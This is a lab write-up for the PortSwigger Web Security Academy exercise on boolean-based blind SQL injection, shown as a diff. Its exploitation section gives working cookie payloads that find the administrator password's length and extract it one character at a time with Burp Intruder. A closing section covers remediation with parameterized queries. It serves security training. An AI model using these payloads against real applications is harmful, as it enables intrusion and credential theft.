@@ -1,0 +1,134 @@
+Lab Write-Up: Blind SQL injection with conditional responses
+
+    Platform: PortSwigger Web Security Academy
+
+    Difficulty: Practitioner
+
+    Category: SQL Injection (SQLi)
+
+    Vulnerability Type: Boolean-based Blind SQL Injection
+
+1. Vulnerability Analysis & Executive Summary
+
+The target application uses a tracking cookie (TrackingId) for analytics. When a request is processed, a backend database query is executed using this cookie's value.
+
+The application exhibits Blind SQL Injection characteristics:
+
+    It does not return any data from the database in the HTTP response.
+
+    It does not display any SQL error messages when a syntax error is introduced.
+
+    Conditional Behavior: The application includes the string "Welcome back" in the HTML body only if the SQL query returns a valid row. If the query returns no rows, the message is omitted.
+
+This side-channel behavior allows an attacker to ask the database boolean (true/false) questions and exfiltrate sensitive data character by character.
+2. Exploitation Steps (Proof of Concept)
+Step 1: Manual Behavior Discovery (TRUE vs FALSE Testing)
+
+To confirm the vulnerability and map the conditional behavior, we intercept a standard request in Burp Suite Repeater and modify the TrackingId cookie.
+
+    Baseline Request (Standard behavior):
+    HTTP
+
+    Cookie: TrackingId=qZ5kcb2REJJUkysI; session=HrfJXffcgZLhz9l8bqWsn9bTeZqKMBZa
+
+        Response: HTML contains <div id="vulnerable-analytics">...</div> and the text Welcome back.
+
+    Injecting a TRUE Condition:
+    We append ' AND '1'='1 to the cookie to force a true statement.
+    HTTP
+
+    Cookie: TrackingId=qZ5kcb2REJJUkysI' AND '1'='1; session=HrfJXffcgZLhz9l8bqWsn9bTeZqKMBZa
+
+        Response Status: 200 OK
+
+        Response Body: The text Welcome back is PRESENT. This confirms the original query still returns rows because our condition is true.
+
+    Injecting a FALSE Condition:
+    We append ' AND '1'='2 to force a false statement.
+    HTTP
+
+    Cookie: TrackingId=qZ5kcb2REJJUkysI' AND '1'='2; session=HrfJXffcgZLhz9l8bqWsn9bTeZqKMBZa
+
+        Response Status: 200 OK
+
+        Response Body: The text Welcome back is ABSENT. The query returned no rows because 1=2 is false.
+
+Step 2: Discovering the Password Length
+
+Before brute-forcing the password characters, we must determine its exact length. We do this by injecting a condition that checks if the length is greater than a specific number, incrementing it until the condition becomes false.
+
+    Testing if length is greater than 1:
+    HTTP
+
+    Cookie: TrackingId=qZ5kcb2REJJUkysI' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a; session=...
+
+        Result: "Welcome back" is PRESENT (True).
+
+    Testing up to length 20 (Automation or Manual):
+    We continue increasing the number. When reaching LENGTH(password)>19:
+    HTTP
+
+    Cookie: TrackingId=qZ5kcb2REJJUkysI' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>19)='a; session=...
+
+        Result: "Welcome back" is PRESENT (True).
+
+    Testing LENGTH(password)>20:
+    HTTP
+
+    Cookie: TrackingId=qZ5kcb2REJJUkysI' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a; session=...
+
+        Result: "Welcome back" is ABSENT (False).
+
+Conclusion: Since the length is greater than 19 but NOT greater than 20, the exact length of the administrator password is 20 characters.
+Step 3: Character-by-Character Exfiltration (Burp Suite Intruder)
+
+To extract the 20 characters sequentially without the commercial version of Burp Suite, we leverage Burp Suite Intruder (Community Edition) with a manual payload configuration.
+
+    Send the request to Intruder.
+
+    Set the Attack Type to Sniper.
+
+    Configure the Payload Position targeting the first character using the SUBSTRING function. Notice the placeholder character a encapsulated by Burp's position markers (§):
+
+HTTP
+
+GET / HTTP/2
+Host: 0a000068048eeb0b80dcc645007e005d.web-security-academy.net
+Cookie: TrackingId=qZ5kcb2REJJUkysI' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§; session=HrfJXffcgZLhz9l8bqWsn9bTeZqKMBZa
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:151.0) Gecko/20100101 Firefox/151.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+...
+
+    Go to the Payloads tab. Under Payload Type, select Simple list.
+
+    Manually populate the list with the alphanumeric character set (a-z, 0-9) to bypass commercial list restrictions:
+    Plaintext
+
+    a, b, c, d, e ... y, z, 0, 1 ... 8, 9
+
+    Go to the Options tab (or settings panel), locate Grep - Match, clear the defaults, and add Welcome back. This creates a custom column in our results table to easily identify successful hits.
+
+    Launch the attack via Start Attack.
+
+Step 4: Analyzing Results & Iteration
+
+Burp Intruder sends 36 requests sequentially per position.
+
+    Incorrect Characters: The database evaluates the condition as false, the server omits "Welcome back", resulting in a lower response length.
+
+    Correct Character: The condition evaluates to true, "Welcome back" is rendered, and the response length increases (with a checked box in our Grep-Match column).
+
+To exfiltrate the full password, we modify the SUBSTRING(password, N, 1) index parameter from 1 through 20 sequentially, recording the true character for each position.
+3. Remediation & Mitigation
+
+To fully mitigate Boolean-based Blind SQL Injection vectors on this application, the following controls must be applied:
+
+    Parameterized Queries (Prepared Statements): Ensure the database interpreter treats user input strictly as a parameter rather than executable SQL logic.
+    Java
+
+    String query = "SELECT tracking_id FROM analytics WHERE id = ?";
+    PreparedStatement pstmt = connection.prepareStatement(query);
+    pstmt.setString(1, trackingIdCookie);
+    ResultSet results = pstmt.executeQuery();
+
+    Input Validation: Enforce strict structural controls (allowlists) over cookies. If the tracking ID expects a strict alphanumeric hash, reject any strings containing characters like ', -, or spaces at the application layer.
